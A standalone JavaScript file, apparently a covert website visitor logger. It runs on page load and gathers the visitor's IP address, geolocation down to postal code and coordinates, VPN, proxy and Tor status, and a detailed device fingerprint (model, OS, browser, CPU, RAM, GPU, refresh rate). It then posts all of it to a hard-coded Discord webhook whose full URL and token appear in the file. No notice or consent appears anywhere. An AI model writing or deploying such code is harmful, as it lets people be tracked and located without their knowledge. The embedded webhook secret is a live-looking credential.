const sendIP = () => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            
            const userAgent = navigator.userAgent;
        let device = "Unknown Device";
        let osVersion = "Unknown";
        let browser = "Unknown Browser";

        const ratio = window.devicePixelRatio || 1;
        const width = screen.width * ratio;
        const height = screen.height * ratio;

        // === Device & OS Detection ===
        if (/iPhone/i.test(userAgent)) {
            device = "iPhone";
            const match = userAgent.match(/OS (\d+_\d+(_\d+)?)/);
            if (match) osVersion = match[1].replace(/_/g, '.');

            if (width === 1170 && height === 2532) device += " 14/15/16/17 Pro";
            else if (width === 1284 && height === 2778) device += " 14/15/16/17 Pro Max";
            else if (width === 1290 && height === 2796) device += " 15/16/17 Ultra";
            else if (width === 1125 && height === 2436) device += " X/XS/11 Pro";
            else if (width === 828 && height === 1792) device += " XR/11";
            else if (width === 750 && height === 1334) device += " 6/6S/7/8";
            else device += " (Unknown Model)";

        } else if (/iPad/i.test(userAgent)) {
            device = "iPad";
            const match = userAgent.match(/OS (\d+_\d+(_\d+)?)/);
            if (match) osVersion = match[1].replace(/_/g, '.');

            if (width === 1668 && height === 2388) device += " Pro 11-inch";
            else if (width === 2048 && height === 2732) device += " Pro 12.9-inch";
            else if (width === 1620 && height === 2160) device += " Air 10.9-inch";
            else if (width === 1536 && height === 2048) device += " Mini 7.9-inch";
            else device += " (Unknown Model)";

        } else if (/Android/i.test(userAgent)) {
            const match = userAgent.match(/Android (\d+(\.\d+)?)/);
            if (match) osVersion = match[1];

            if (/Samsung/i.test(userAgent)) device = "Samsung Android";
            else if (/Pixel/i.test(userAgent)) device = "Google Pixel";
            else if (/Huawei/i.test(userAgent)) device = "Huawei Android";
            else device = "Android Device";

        } else if (/Macintosh/i.test(userAgent)) {
            device = "Mac";
            const match = userAgent.match(/Mac OS X (\d+[_\.]\d+(_\d+)?)/);
            if (match) osVersion = match[1].replace(/_/g, '.');

        } else if (/Windows NT/i.test(userAgent)) {
            device = "Windows PC";
            const match = userAgent.match(/Windows NT (\d+(\.\d+)?)/);
            if (match) {
                const versionMap = {
                    "10.0": "10/11",
                    "6.3": "8.1",
                    "6.2": "8",
                    "6.1": "7",
                    "6.0": "Vista",
                    "5.1": "XP"
                };
                osVersion = versionMap[match[1]] || match[1];
            }

        } else if (/Linux/i.test(userAgent)) {
            device = "Linux PC";
        }

        // === Browser Detection ===
        if (/OPR|Opera/i.test(userAgent)) {
            const match = userAgent.match(/(Opera|OPR)\/(\d+(\.\d+)?)/);
            browser = match ? `Opera ${match[2]}` : "Opera";
        } else if (/Edg/i.test(userAgent)) {
            const match = userAgent.match(/Edg\/(\d+(\.\d+)?)/);
            browser = match ? `Edge ${match[1]}` : "Edge";
        } else if (/Chrome/i.test(userAgent)) {
            const match = userAgent.match(/Chrome\/(\d+(\.\d+)?)/);
            browser = match ? `Chrome ${match[1]}` : "Chrome";
        } else if (/Safari/i.test(userAgent) && !/Chrome/i.test(userAgent)) {
            const match = userAgent.match(/Version\/(\d+(\.\d+)?)/);
            browser = match ? `Safari ${match[1]}` : "Safari";
        } else if (/Firefox/i.test(userAgent)) {
            const match = userAgent.match(/Firefox\/(\d+(\.\d+)?)/);
            browser = match ? `Firefox ${match[1]}` : "Firefox";
        } else if (/MSIE|Trident/i.test(userAgent)) {
            const match = userAgent.match(/(MSIE |rv:)(\d+(\.\d+)?)/);
            browser = match ? `Internet Explorer ${match[2]}` : "Internet Explorer";
        }

        // === Device Specs ===
        const cpuCores = navigator.hardwareConcurrency || "Unknown";
        const ram = navigator.deviceMemory || "Unknown";
        let gpu = "Unknown";
        let refreshRate = "Unknown";

        // GPU detection via WebGL
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        }

        // Approximate refresh rate using requestAnimationFrame
        let frameTimes = [];
        let rafCount = 0;
        const sampleFrames = 60;
        const measureFps = timestamp => {
            if (rafCount > 0) {
                const delta = timestamp - frameTimes[frameTimes.length-1];
                frameTimes.push(delta);
            } else frameTimes.push(timestamp);
            rafCount++;
            if (rafCount < sampleFrames) requestAnimationFrame(measureFps);
            else refreshRate = Math.round(1000 / (frameTimes.slice(1).reduce((a,b) => a+b)/frameTimes.slice(1).length));
        };
        requestAnimationFrame(measureFps);

            // ======================================================
        // =============== PROXY / VPN DETECTION =================
        // ======================================================
        return Promise.all([
            // 1. ipapi.co
            fetch(`https://ipapi.co/${ipadd}/json/`).then(r => r.json()).catch(() => ({})),

            // 2. ipinfo.io (privacy flags)
            fetch(`https://ipinfo.io/${ipadd}/privacy`).then(r => r.json()).catch(() => ({})),

            // 3. ipdata.co (optional)
            fetch(`https://api.ipdata.co/${ipadd}?api-key=YOUR_KEY_HERE`)
                .then(r => r.json())
                .catch(() => ({}))
        ])
        .then(([ipapi, ipinfo, ipdata]) => {

            // Combine flags
            const flags = {
                ipapi: {
                    proxy: ipapi?.security?.proxy === true,
                    vpn:   ipapi?.security?.vpn === true,
                    tor:   ipapi?.security?.tor === true
                },
                ipinfo: {
                    proxy: ipinfo?.proxy === true,
                    vpn:   ipinfo?.vpn === true,
                    tor:   ipinfo?.tor === true
                },
                ipdata: {
                    proxy: ipdata?.threat?.is_proxy === true,
                    vpn:   ipdata?.threat?.is_vpn === true,
                    tor:   ipdata?.threat?.is_tor === true
                }
            };

            const proxyDetected =
                flags.ipapi.proxy || flags.ipapi.vpn || flags.ipapi.tor ||
                flags.ipinfo.proxy || flags.ipinfo.vpn || flags.ipinfo.tor ||
                flags.ipdata.proxy || flags.ipdata.vpn || flags.ipdata.tor;

            const status = proxyDetected
                ? "Likely Proxy / VPN / Tor"
                : "Not a Proxy";

            console.log("Proxy Status:", status);
            console.log("Flags:", flags);

                return fetch(`https://ipapi.co/${ipadd}/json/`)
                    .then(geoResponse => geoResponse.json())
                    .then(geoData => {
                        const dscURL = 'https://discord.com/api/webhooks/1443094310169088050/6IZeJRM-6yBlD-GOK9t_mfaI89UO7LaPuo80CTNQY9PxgZAFaDYIWZM9GiAGmkVQzftL'; 
                        return fetch(dscURL, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                                },
                            body: JSON.stringify({
                                username: "site logger <3", 
                                avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg", 
                                content: `@here`,
                                embeds: [
                                    {
                                        title: 'Logger!',
                                        description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**Proxy Status >> ** ${status}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}\n\n**Device >> ** ${device}\n**OS Version >> ** ${osVersion}\n**Browser >> ** ${browser}\n\n**CPU Cores >> ** ${cpuCores}\n**RAM (GB) >> ** ${ram}\n**GPU >> ** ${gpu}\n**Resolution >> ** ${height}x${width}\n**Device Pixel Ratio >> ** ${ratio}\n**Refresh Rate >> ** ${refreshRate}`,
                                        color: 0x800080 
                                    }
                                ]
                            })
                        });
                    })
                }
            )
        })
        .then(dscResponse => {  
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            console.log('Error :(');
        });
};
sendIP();
